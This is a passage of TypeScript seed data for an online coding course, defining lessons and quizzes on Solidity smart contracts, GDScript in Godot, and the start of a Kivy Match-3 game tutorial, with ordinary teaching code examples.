          prompt: 'The pragma line at the top of a Solidity file pins which compiler ____ the contract expects.',
          options: [],
          answer: 'version',
        },
      ],
    },
  },
  {
    title: 'State Variables and Data Types',
    content: lessonContent(
      'State Variables and Data Types',
      `A **state variable** is permanently stored on the blockchain as part of the contract's data, every write to one costs real money (**gas**), which shapes how Solidity code is written more than almost anything else.\n\n\`\`\`solidity\ncontract Wallet {\n    uint256 public balance;          // unsigned integer, 256 bits\n    address public owner;             // an Ethereum address\n    bool public isLocked;\n    string public label = "Savings";\n\n    constructor() {\n        owner = msg.sender;   // the account that deployed the contract\n        balance = 0;\n    }\n}\n\`\`\`\n\n## Core types\n\n| Type | Meaning |\n|---|---|\n| \`uint256\` | Unsigned integer, 0 or positive, the most common numeric type |\n| \`int256\` | Signed integer, can be negative |\n| \`address\` | A 20-byte Ethereum account or contract address |\n| \`bool\` | true or false |\n| \`string\` / \`bytes\` | Text or raw byte data |\n\nSolidity has no floating-point type at all, financial logic is done in whole-number units (like storing cents instead of dollars) to avoid the rounding errors that plague floating-point money math in other languages.\n\n## msg.sender\n\n\`msg.sender\` is a special, always-available variable holding the address that called the current function, it's the foundation almost every access-control check in Solidity is built on, "is the caller allowed to do this?"\n\n\`\`\`solidity\nfunction withdraw() public {\n    require(msg.sender == owner, "Not the owner");\n    // ...\n}\n\`\`\``
    ),
    quiz: {
      title: 'State Variables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does Solidity have no floating-point type?',
          options: ['The EVM cannot store numbers', 'To avoid rounding errors in financial calculations, using whole-number units instead', 'Floating point was removed in a recent update', 'It is a bug that will be fixed'],
          answer: 'To avoid rounding errors in financial calculations, using whole-number units instead',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'msg.sender always holds the address that called the current function.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The Solidity type used to store an Ethereum account or contract address is: ____',
          options: [],
          answer: 'address',
        },
      ],
    },
  },
  {
    title: 'Functions and Visibility',
    content: lessonContent(
      'Functions and Visibility',
      `Every Solidity function needs an explicit **visibility**, controlling who can call it, and a **mutability** annotation, telling the EVM (and gas estimators) whether it touches the blockchain's state at all.\n\n\`\`\`solidity\ncontract Counter {\n    uint256 private count;\n\n    function increment() public {\n        count += 1;   // modifies state, costs gas\n    }\n\n    function getCount() public view returns (uint256) {\n        return count;  // only reads state, free to call\n    }\n\n    function double(uint256 n) public pure returns (uint256) {\n        return n * 2;   // touches no state at all, purely computes\n    }\n}\n\`\`\`\n\n## Visibility\n\n| Modifier | Callable from |\n|---|---|\n| \`public\` | Anyone, and from within the contract |\n| \`external\` | Only from outside the contract |\n| \`internal\` | This contract and contracts that inherit from it |\n| \`private\` | Only this exact contract |\n\n## Mutability\n\n- \`view\` functions read state but never modify it, calling one from outside costs **no gas**.\n- \`pure\` functions don't even read state, they're a pure computation on their inputs, also free to call.\n- Functions with neither modify state, and always cost gas when called as a real transaction.\n\n> [!TIP]\n> Marking a read-only function \`view\` isn't just documentation, the compiler enforces it, if you accidentally write to a state variable inside a function marked \`view\`, it simply won't compile.`
    ),
    quiz: {
      title: 'Functions and Visibility Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function type touches no state at all, purely computing from its inputs?',
          options: ['view', 'pure', 'external', 'payable'],
          answer: 'pure',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Calling a view function from outside the contract (not as part of a state-changing transaction) costs no gas.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The visibility modifier that only allows a function to be called from outside the contract is: ____',
          options: [],
          answer: 'external',
        },
      ],
    },
  },
  {
    title: 'Modifiers and Access Control',
    content: lessonContent(
      'Modifiers and Access Control',
      `A **modifier** wraps reusable logic, most commonly an access-control check, around a function, avoiding copy-pasting the same \`require\` statement into every function that needs it.\n\n\`\`\`solidity\ncontract Vault {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, "Not the owner");\n        _;   // this is where the wrapped function's body runs\n    }\n\n    function withdraw(uint256 amount) public onlyOwner {\n        // only the owner can ever reach this point\n    }\n\n    function setOwner(address newOwner) public onlyOwner {\n        owner = newOwner;\n    }\n}\n\`\`\`\n\nThe \`_;\` inside a modifier marks exactly where the decorated function's own body gets spliced in, everything before \`_;\` runs first (here, the ownership check), and if \`require\` fails, the function body after it never executes at all, the whole transaction reverts.\n\n## require, revert, and assert\n\n\`\`\`solidity\nfunction transfer(address to, uint256 amount) public {\n    require(amount > 0, "Amount must be positive");   // validate input\n    require(balance[msg.sender] >= amount, "Insufficient balance");\n    balance[msg.sender] -= amount;\n    balance[to] += amount;\n}\n\`\`\`\n\n\`require\` checks a condition and reverts the **entire transaction** (undoing every state change made so far in it) with an error message if it fails, this all-or-nothing behavior is fundamental, a smart contract transaction can never be left half-finished.`
    ),
    quiz: {
      title: 'Modifiers and Access Control Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does _; represent inside a modifier?',
          options: ['A syntax error placeholder', 'Where the decorated function\'s body gets inserted', 'A private variable', 'The end of the contract'],
          answer: "Where the decorated function's body gets inserted",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'If a require() check fails partway through a function, all state changes made earlier in that same transaction are undone.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A reusable block of logic, commonly an access check, wrapped around a function is called a ____.',
          options: [],
          answer: 'modifier',
        },
      ],
    },
  },
  {
    title: 'Mappings, Structs and Arrays',
    content: lessonContent(
      'Mappings, Structs and Arrays',
      `Solidity's core data structures for organizing on-chain state, each with tradeoffs shaped by the fact that every operation costs gas.\n\n## Mappings\n\nA mapping is a key-value store, Solidity's version of a hash map, but with a twist: it has **no length**, and no way to iterate over its keys, every possible key conceptually already exists, mapped to its type's default (zero) value:\n\n\`\`\`solidity\nmapping(address => uint256) public balances;\n\nfunction deposit() public payable {\n    balances[msg.sender] += msg.value;\n}\n\`\`\`\n\nThere's no "key not found" error, \`balances[someRandomAddress]\` simply returns \`0\` if nothing was ever set, exactly the same as if it had explicitly been set to zero.\n\n## Structs\n\n\`\`\`solidity\nstruct Player {\n    string name;\n    uint256 xp;\n    bool active;\n}\n\nmapping(address => Player) public players;\n\nfunction register(string memory name) public {\n    players[msg.sender] = Player(name, 0, true);\n}\n\`\`\`\n\nMappings and structs combine constantly, exactly like the pattern above, associating a wallet address with a whole record of data about it.\n\n## Arrays\n\n\`\`\`solidity\naddress[] public registeredPlayers;\n\nfunction register2() public {\n    registeredPlayers.push(msg.sender);\n}\n\`\`\`\n\nUnlike mappings, arrays **do** have a length and can be iterated, but looping over a large on-chain array in a function costs gas proportional to its size, and can even become too expensive to call at all if it grows large enough. This is exactly why mappings, not arrays, are the default choice for most on-chain lookups.`
    ),
    quiz: {
      title: 'Mappings, Structs and Arrays Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens when you read a mapping key that was never explicitly set?',
          options: ['It throws an error', 'It returns the type\'s default (zero) value', 'It returns null', 'The transaction reverts'],
          answer: "It returns the type's default (zero) value",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Looping over a large on-chain array can become expensive or even too costly to call as gas usage grows with its size.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Solidity\'s key-value data structure, which has no length and cannot be iterated, is called a ____.',
          options: [],
          answer: 'mapping',
        },
      ],
    },
  },
  {
    title: 'Events and Error Handling',
    content: lessonContent(
      'Events and Error Handling',
      `Smart contracts run in an isolated environment with no built-in "print to console" for the outside world, **events** are how a contract communicates what happened to applications and users watching the blockchain.\n\n\`\`\`solidity\ncontract Token {\n    mapping(address => uint256) public balances;\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    function transfer(address to, uint256 amount) public {\n        require(amount > 0, "Amount must be positive");\n        require(balances[msg.sender] >= amount, "Insufficient balance");\n\n        balances[msg.sender] -= amount;\n        balances[to] += amount;\n\n        emit Transfer(msg.sender, to, amount);\n    }\n}\n\`\`\`\n\n\`emit Transfer(...)\` writes a permanent, cheap-to-store log entry to the blockchain, off-chain applications (like a wallet's UI, or a block explorer) listen for these events instead of constantly polling contract state, it's how "your transaction went through" notifications actually work under the hood. \`indexed\` parameters can be efficiently searched/filtered by event listeners.\n\n## Custom errors\n\nModern Solidity favors custom errors over plain string messages, they're significantly cheaper in gas:\n\n\`\`\`solidity\nerror InsufficientBalance(uint256 available, uint256 requested);\n\nfunction withdraw(uint256 amount) public {\n    if (balances[msg.sender] < amount) {\n        revert InsufficientBalance(balances[msg.sender], amount);\n    }\n    balances[msg.sender] -= amount;\n}\n\`\`\`\n\n\`revert\` with a custom error immediately stops execution and undoes all state changes in the current transaction, exactly like \`require\`, but lets you attach structured data (here, the actual vs. requested amounts) instead of just a plain string.`
    ),
    quiz: {
      title: 'Events and Error Handling Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main purpose of an event in Solidity?',
          options: ['To store data more cheaply than a state variable', 'To let off-chain applications know something happened on-chain', 'To validate function inputs', 'To restrict who can call a function'],
          answer: 'To let off-chain applications know something happened on-chain',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Custom errors are generally cheaper in gas than plain require() string messages.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to write an event to the blockchain\'s log is: ____ Transfer(...)',
          options: [],
          answer: 'emit',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Simple Token Contract',
    content: lessonContent(
      'Final Project: Build a Simple Token Contract',
      `Combine everything from this course into a simple, ERC-20-style fungible token contract, the same basic pattern underlying most tokens on Ethereum.\n\n## Requirements\n\n1. Declare state variables for \`name\`, \`symbol\`, \`totalSupply\`, and a \`mapping(address => uint256)\` for balances.\n2. In the constructor, mint the entire \`totalSupply\` to \`msg.sender\` (the deployer).\n3. Implement \`function transfer(address to, uint256 amount) public returns (bool)\`, using \`require\` to check the sender has enough balance, updating both balances, and emitting a \`Transfer\` event.\n4. Implement \`function balanceOf(address account) public view returns (uint256)\`.\n5. Add an \`onlyOwner\`-style modifier and a \`mint(address to, uint256 amount)\` function restricted to the contract's owner, that increases \`totalSupply\` and the recipient's balance.\n6. Use a custom error (not a plain string) for the insufficient-balance case in \`transfer\`.\n\n## Stretch goals\n\n- Add \`approve\`/\`transferFrom\` to support spending on someone else's behalf (the rest of the real ERC-20 standard).\n- Add a \`burn(uint256 amount)\` function that destroys tokens from the caller's own balance.\n- Write a few test cases (using Hardhat or Foundry) proving transfer fails correctly when the sender has insufficient balance.\n\nSubmit a link to your finished contract below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const gdscriptLessons: SeedLesson[] = [
  {
    title: 'Introduction to GDScript & Godot',
    content: lessonContent(
      'Introduction to GDScript & Godot',
      `**Godot** is a free, open-source game engine, and **GDScript** is its built-in scripting language, designed specifically to feel natural for game development and to integrate tightly with the engine's editor.\n\n## Nodes and the scene tree\n\nEverything in a Godot game is a **node**: a sprite, a button, a sound player, even an abstract logic container. Nodes are arranged into a tree, and a saved tree of nodes is called a **scene**:\n\n\`\`\`\nPlayer (CharacterBody2D)\n├── Sprite2D\n├── CollisionShape2D\n└── Camera2D\n\`\`\`\n\nA scene can be instanced inside another scene, exactly like a reusable component, this is how a "Player" scene gets placed into a "Level" scene without duplicating its logic.\n\n## Your first script\n\n\`\`\`gdscript\nextends Node2D\n\nfunc _ready():\n    print("Hello, Kodstigen!")\n\nfunc _process(delta):\n    # runs every single frame, delta is the time since the last frame in seconds\n    pass\n\`\`\`\n\n- \`extends Node2D\` attaches this script's behavior to a node of type \`Node2D\` (or anything that inherits from it), scripts in Godot are never standalone, they always extend some node type.\n- \`_ready()\` is a **lifecycle method** the engine calls automatically once, when the node first enters the running scene.\n- \`_process(delta)\` is called automatically every rendered frame, \`delta\` lets you write movement and animation that's consistent regardless of frame rate.\n\n> [!TIP]\n> Function names starting with an underscore, like \`_ready\` and \`_process\`, are **engine callbacks**, Godot calls them for you at the right moment, you never call them yourself directly.`
    ),
    quiz: {
      title: 'Introduction to GDScript Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is a "scene" in Godot?',
          options: ['A single image asset', 'A saved tree of nodes that can be instanced elsewhere', 'A sound effect', 'A compiled executable'],
          answer: 'A saved tree of nodes that can be instanced elsewhere',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '_process(delta) is called automatically by the engine every frame.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The lifecycle method Godot calls automatically once, when a node first enters the running scene, is: _____()',
          options: [],
          answer: '_ready',
        },
      ],
    },
  },
  {
    title: 'Variables and Types',
    content: lessonContent(
      'Variables and Types',
      `GDScript is dynamically typed by default, like Python, but with **optional static typing** you can add for extra safety and editor autocompletion.\n\n\`\`\`gdscript\nvar xp = 0              # dynamically typed, inferred as int\nvar name := "Ada"        # := infers AND locks in the type (String)\nvar health: float = 100.0 # explicit static type annotation\n\nxp += 10\n\`\`\`\n\n\`var xp = 0\` works exactly like Python, no type is enforced. \`var name := "Ada"\` (with a colon before \`=\`) tells the compiler to infer the type once and then **enforce** it, assigning a number to \`name\` later becomes a compile-time error instead of a silent bug.\n\n## Exported variables\n\nA variable marked \`@export\` becomes editable directly in the Godot editor's Inspector panel, no code changes needed to tweak it:\n\n\`\`\`gdscript\nextends CharacterBody2D\n\n@export var speed: float = 300.0\n@export var jump_velocity: float = -400.0\n\`\`\`\n\nThis is one of GDScript's most distinctive features, a game designer with no programming background can tune \`speed\` and \`jump_velocity\` by dragging a slider in the editor, without ever opening this file.\n\n## Common built-in types\n\n\`\`\`gdscript\nvar position := Vector2(100, 50)   # a 2D point/vector, everywhere in 2D games\nvar items := ["sword", "shield"]     # array\nvar stats := {"str": 10, "dex": 8}    # dictionary\n\`\`\`\n\n\`Vector2\` isn't just a convenience class, it has built-in math operators (\`+\`, \`-\`, \`*\`) that work exactly as you'd expect mathematically, since 2D position and movement math is something almost every game script needs constantly.`
    ),
    quiz: {
      title: 'Variables and Types Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does marking a variable with @export do?',
          options: ['Makes it read-only', 'Makes it editable in the Godot editor\'s Inspector panel', 'Deletes it when the game exits', 'Converts it to a global variable'],
          answer: "Makes it editable in the Godot editor's Inspector panel",
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'GDScript requires every variable to have an explicit static type declared.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The built-in type commonly used to represent a 2D point or movement vector is: ____',
          options: [],
          answer: 'Vector2',
        },
      ],
    },
  },
  {
    title: 'Control Flow and Functions',
    content: lessonContent(
      'Control Flow and Functions',
      `GDScript's syntax leans heavily on Python: indentation defines blocks, no curly braces, no semicolons.\n\n\`\`\`gdscript\nvar xp = 45\n\nif xp >= 100:\n    print("Level up!")\nelif xp >= 50:\n    print("Almost there")\nelse:\n    print("Keep going")\n\`\`\`\n\n## Loops\n\n\`\`\`gdscript\nfor i in range(5):\n    print(i)\n\nvar items = ["sword", "shield", "potion"]\nfor item in items:\n    print(item)\n\nvar tries = 0\nwhile tries < 3:\n    tries += 1\n\`\`\`\n\n\`for item in items\` iterates directly over any array-like value, exactly like Python's \`for x in list\`.\n\n## Functions\n\n\`\`\`gdscript\nfunc calculate_damage(base: int, multiplier: float = 1.0) -> int:\n    return int(base * multiplier)\n\nvar dmg = calculate_damage(10)        # 10, uses the default multiplier\nvar crit = calculate_damage(10, 2.0)   # 20\n\`\`\`\n\n\`multiplier: float = 1.0\` gives the parameter a **default value**, callers can omit it entirely. \`-> int\` is an optional return-type annotation, purely for clarity and editor tooling, not enforced as strictly as some statically-typed languages.\n\n> [!TIP]\n> Because indentation is meaningful, mixing tabs and spaces in the same GDScript file causes real parse errors, not just style warnings. Configure your editor to use one or the other consistently.`
    ),
    quiz: {
      title: 'Control Flow and Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What defines a code block in GDScript?',
          options: ['Curly braces {}', 'The keyword "block"', 'Indentation, like Python', 'Semicolons'],
          answer: 'Indentation, like Python',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A function parameter can be given a default value, making it optional for callers.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a function in GDScript is: ____ calculate_damage(base):',
          options: [],
          answer: 'func',
        },
      ],
    },
  },
  {
    title: 'Signals',
    content: lessonContent(
      'Signals',
      `**Signals** are Godot's event system, letting nodes communicate without directly knowing about each other, one of the most distinctive and important GDScript features to understand well.\n\n\`\`\`gdscript\n# Health.gd, attached to a Player node\nextends Node\n\nsignal health_depleted\nsignal health_changed(new_value)\n\nvar health := 100\n\nfunc take_damage(amount: int):\n    health -= amount\n    health_changed.emit(health)\n    if health <= 0:\n        health_depleted.emit()\n\`\`\`\n\n\`\`\`gdscript\n# UI.gd, attached to a completely separate HUD node\nfunc _ready():\n    var player = get_node("/root/Game/Player")\n    player.health_changed.connect(_on_health_changed)\n    player.health_depleted.connect(_on_player_died)\n\nfunc _on_health_changed(new_value):\n    print("Health is now: ", new_value)\n\nfunc _on_player_died():\n    print("Game over!")\n\`\`\`\n\n## Why signals instead of direct calls?\n\nThe \`Health\` script has **no idea** the UI even exists, it just \`emit\`s when something happens. The \`UI\` script \`connect\`s to those signals separately. This means the \`Player\`'s health logic and the \`HUD\`'s display logic are completely decoupled, you can add a second listener (a sound effect script, an achievement tracker) without touching \`Health.gd\` at all, and swap out the UI entirely without touching gameplay code.\n\nThis pattern (also called "observer" or "pub/sub" in other languages) is exactly why Godot projects tend to stay maintainable as they grow, systems talk *about* events, not directly *to* each other.`
    ),
    quiz: {
      title: 'Signals Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the main benefit of using signals instead of one script calling another directly?',
          options: ['Signals run faster than function calls', 'The emitting script does not need to know who, if anyone, is listening', 'Signals are required by the Godot compiler', 'Signals automatically save the game'],
          answer: 'The emitting script does not need to know who, if anyone, is listening',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'A script must know exactly which other node will receive a signal before it can emit it.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To trigger a signal named health_depleted, you call: health_depleted.____()',
          options: [],
          answer: 'emit',
        },
      ],
    },
  },
  {
    title: 'Node References and the Scene Tree',
    content: lessonContent(
      'Node References and the Scene Tree',
      `A script attached to one node very often needs to reach other nodes nearby in the scene tree, to read their state or call their methods.\n\n\`\`\`gdscript\nextends CharacterBody2D\n\n@onready var sprite = $Sprite2D\n@onready var collision_shape = $CollisionShape2D\n\nfunc _ready():\n    sprite.modulate = Color.RED\n\`\`\`\n\n\`$Sprite2D\` is shorthand for \`get_node("Sprite2D")\`, fetching a direct child node by name. \`@onready\` delays that lookup until the node has actually entered the scene tree, if you tried to grab \`$Sprite2D\` immediately when the script's variables are first declared, the child node might not exist yet.\n\n## Relative and absolute paths\n\n\`\`\`gdscript\nvar sibling = get_node("../Enemy")        # relative: up one level, then into Enemy\nvar anywhere = get_node("/root/Game/UI")  # absolute: from the very root of the tree\n\`\`\`\n\nRelative paths (\`\"..\"\` for parent, a name for a child) are more portable, since they don't break if the whole scene gets moved somewhere else in a larger tree, absolute paths are more explicit but brittle if the tree's structure changes.\n\n## Groups\n\nFor finding many unrelated nodes at once, node **groups** are usually cleaner than manual tree-walking:\n\n\`\`\`gdscript\n# In the editor, add each enemy node to a group called "enemies"\nfor enemy in get_tree().get_nodes_in_group("enemies"):\n    enemy.take_damage(10)\n\`\`\`\n\nGroups decouple "find all the enemies" from the tree's exact shape entirely, new enemies just need to join the group, no code elsewhere needs to change.`
    ),
    quiz: {
      title: 'Node References Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is $Sprite2D shorthand for?',
          options: ['A new Sprite2D instance', 'get_node("Sprite2D")', 'A global variable', 'An exported variable'],
          answer: 'get_node("Sprite2D")',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '@onready delays a node lookup until the node has actually entered the scene tree.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Finding all nodes tagged with a shared label, like "enemies", without manually walking the tree, is done with node ____.',
          options: [],
          answer: 'groups',
        },
      ],
    },
  },
  {
    title: 'Classes and Inheritance',
    content: lessonContent(
      'Classes and Inheritance',
      `Beyond scripts attached directly to nodes, GDScript supports full custom classes, letting you define reusable data types and share behavior through inheritance.\n\n\`\`\`gdscript\n# item.gd\nclass_name Item\nextends Resource\n\n@export var name: String\n@export var value: int\n\nfunc describe() -> String:\n    return "%s (%d gold)" % [name, value]\n\`\`\`\n\n\`class_name Item\` registers this script as a globally-available type named \`Item\`, usable anywhere in the project without an explicit \`preload\`. Extending \`Resource\` (rather than a scene node type) makes it a reusable data asset, perfect for things like item definitions that don't need a position in the game world.\n\n## Inheriting your own classes\n\n\`\`\`gdscript\n# weapon.gd\nclass_name Weapon\nextends Item\n\n@export var damage: int\n\nfunc describe() -> String:\n    return super.describe() + " - %d damage" % damage\n\`\`\`\n\n\`Weapon extends Item\` inherits \`name\`, \`value\`, and the base \`describe()\`, then **overrides** \`describe()\` with its own version. \`super.describe()\` calls the parent class's original implementation first, then extends its result, rather than throwing it away entirely, a common pattern when a subclass wants to *add to* behavior instead of fully replacing it.\n\n\`\`\`gdscript\nvar sword = Weapon.new()\nsword.name = "Iron Sword"\nsword.value = 50\nsword.damage = 12\nprint(sword.describe())   # "Iron Sword (50 gold) - 12 damage"\n\`\`\``
    ),
    quiz: {
      title: 'Classes and Inheritance Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does class_name Item do?',
          options: ['Deletes the class', 'Registers the script as a globally-available type usable without preload', 'Makes the class private', 'Attaches the script to every node in the scene'],
          answer: 'Registers the script as a globally-available type usable without preload',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'super.describe() calls the parent class\'s original method instead of the overriding one.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'A custom GDScript class inherits from another with the keyword: ____ Item',
          options: [],
          answer: 'extends',
        },
      ],
    },
  },
  {
    title: 'Final Project: Player Movement Script',
    content: lessonContent(
      'Final Project: Player Movement Script',
      `Combine everything from this course into a real, playable script: 2D platformer-style player movement, the foundation almost every 2D Godot game starts from.\n\n## Requirements\n\n1. Create a script extending \`CharacterBody2D\` with \`@export\` variables for \`speed\` and \`jump_velocity\`, tunable from the editor's Inspector.\n2. In \`_physics_process(delta)\`, read left/right input and set horizontal velocity accordingly (use \`Input.get_axis("ui_left", "ui_right")\` or your own custom input actions).\n3. Apply gravity to vertical velocity every frame, and let the player jump (set a negative vertical velocity) only when \`is_on_floor()\` is true, so jumping mid-air isn't possible.\n4. Call \`move_and_slide()\` to actually apply the computed velocity and handle collisions.\n5. Define a \`signal health_depleted\` and a simple \`health\` variable with a \`take_damage(amount)\` method that emits the signal when health reaches 0, connect to it from a separate script (even a simple one that just prints "Game Over") to prove the decoupling works.\n\n## Stretch goals\n\n- Add a \`Sprite2D\` reference and flip it horizontally based on movement direction.\n- Add a double-jump, allowed only once per airborne period.\n- Add a \`@export var coyote_time: float\` grace period that still allows a jump for a few frames after walking off a platform edge.\n\nSubmit a link to your finished project below, an instructor will review it before you can mark this lesson complete. Good luck!`
    ),
    requiresSubmission: true,
  },
];

const kivyMatch3Lessons: SeedLesson[] = [
  {
    title: 'Kivy: Setup and Installation',
    content: lessonContent(
      'Kivy: Setup and Installation',
      `Kivy is a Python framework for building cross-platform apps and games, the same codebase can run on Windows, macOS, Linux, Android, and iOS. It's especially popular for 2D games with touch controls: puzzle games, card games, simple platformers, and, in this project, a **Match-3 game** in the style of Candy Crush.\n\n## Installing Kivy\n\nLike Pygame, Kivy needs a real window to draw into, so it doesn't run inside this course's browser sandbox. Write and run this project locally with a real Python install.\n\n\`\`\`bash\npip install kivy\n\`\`\`\n\nVerify it installed correctly:\n\n\`\`\`\nimport kivy\nprint(kivy.__version__)\n\`\`\`\n\n## Your first Kivy app\n\nEvery Kivy app is a class that extends \`App\`, with a \`build()\` method that returns the single root widget the whole app is drawn from.\n\n\`\`\`\nfrom kivy.app import App\nfrom kivy.uix.label import Label\n\nclass Match3App(App):\n    def build(self):\n        return Label(text='Match-3, coming soon!', font_size=32)\n\nif __name__ == '__main__':\n    Match3App().run()\n\`\`\`\n\n- \`App.run()\` opens the window and starts Kivy's own event loop (similar in spirit to Pygame's \`while running:\` loop, but Kivy manages it for you).\n- \`build()\` is called once, at startup, whatever widget it returns becomes the entire visible app, later lessons will return a full game board here instead of a single \`Label\`.\n\n## Packaging for mobile\n\nThis course focuses on getting the game working on your desktop, but Kivy code is written with mobile in mind from the start. When you're ready to ship, **Buildozer** packages a Kivy app into a real Android APK:\n\n\`\`\`bash\npip install buildozer\nbuildozer init\nbuildozer -v android debug\n\`\`\`\n\n\`buildozer init\` generates a \`buildozer.spec\` file describing your app (name, permissions, dependencies), and \`buildozer android debug\` builds the actual installable APK. You won't need Buildozer for this course's lessons, it's mentioned here so you know the path from "Python script" to "installable app" exists and is just one command away.\n\n> [!NOTE]\n> Buildozer only runs on Linux (or WSL on Windows). It's completely optional for following this course, everything here runs and is testable as a normal desktop Python app.`
    ),
    quiz: {
      title: 'Kivy Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What must every Kivy app class extend?',
          options: ['Widget', 'App', 'Window', 'Game'],
          answer: 'App',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "A Kivy app's build() method is called repeatedly, once per frame.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____ packages a finished Kivy app into an installable Android APK.',
          options: [],
          answer: 'Buildozer',
        },
      ],
    },
  },
  {
    title: 'Layouts and Widgets',
    content: lessonContent(
      'Layouts and Widgets',
      `A Match-3 board is fundamentally a grid, so before writing any game logic, this lesson covers the Kivy widgets that will hold it: layouts, which arrange other widgets, and buttons, which will represent each gem.\n\n## Layouts arrange widgets, they don't draw anything themselves\n\n\`\`\`\nfrom kivy.app import App\nfrom kivy.uix.boxlayout import BoxLayout\nfrom kivy.uix.button import Button\nfrom kivy.uix.label import Label\n\nclass DemoApp(App):\n    def build(self):\n        root = BoxLayout(orientation='vertical')\n        root.add_widget(Label(text='Score: 0', font_size=24))\n        root.add_widget(Button(text='Shuffle'))\n        return root\n\nif __name__ == '__main__':\n    DemoApp().run()\n\`\`\`\n\n- \`BoxLayout\` stacks its children in a single row or column, \`orientation='vertical'\` stacks them top to bottom.\n- \`add_widget(...)\` is how every widget, layout or not, gets a child added to it. Layouts just also decide *where* their children end up.\n\n## GridLayout: the board itself\n\nAn 8×8 Match-3 board is a perfect fit for \`GridLayout\`, which arranges children into a fixed number of columns (and, implicitly, however many rows the number of children requires):\n\n\`\`\`\nfrom kivy.uix.gridlayout import GridLayout\nfrom kivy.uix.button import Button\n\nclass BoardDemoApp(App):\n    def build(self):\n        grid = GridLayout(cols=8)\n        for i in range(8 * 8):\n            grid.add_widget(Button(text=str(i)))\n        return grid\n\nif __name__ == '__main__':\n    BoardDemoApp().run()\n\`\`\`\n\nSetting \`cols=8\` and then adding 64 buttons is all it takes, \`GridLayout\` automatically wraps to a new row every 8 widgets, giving you an 8×8 grid with zero manual positioning math.\n\n## Buttons as gems\n\nEach cell in the board will be a \`Button\`, gems don't need any text, just a solid background color, which Kivy exposes through two properties together:\n\n\`\`\`\nfrom kivy.uix.button import Button\n\ngem = Button(text='', background_normal='', background_color=(0.9, 0.2, 0.2, 1))  # solid red\n\`\`\`\n\n- \`background_color\` is an RGBA tuple, each channel from \`0\` to \`1\` (not 0-255 like most other tools).\n- \`background_normal=''\` is required to actually *see* that color, by default Kivy's \`Button\` draws its built-in gray button-image on top of \`background_color\`, setting it to an empty string turns that image off so the flat color shows through.\n\n## Responding to taps\n\n\`\`\`\ndef on_gem_pressed(instance):\n    print('tapped a gem!')\n\ngem.bind(on_press=on_gem_pressed)\n\`\`\`\n\n\`bind(on_press=...)\` connects a function to the button's press event, Kivy calls it with the widget instance itself as the only argument, which is exactly how the next lesson will know *which* gem was tapped.\n\n> [!TIP]\n> \`size_hint\` (a tuple like \`(1, 1)\`) controls how much of the available space a widget claims relative to its siblings, the default \`(1, 1)\` already makes every gem button fill its grid cell evenly, so you won't need to touch it for this project.`
    ),
    quiz: {
      title: 'Layouts and Widgets Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which layout automatically arranges widgets into a fixed number of columns?',
          options: ['BoxLayout', 'GridLayout', 'StackLayout', 'FloatLayout'],
          answer: 'GridLayout',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "Setting background_normal='' on a Button is necessary to see its background_color clearly.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'button.____(on_press=handler) connects a function to run whenever the button is tapped.',
          options: [],
          answer: 'bind',
        },
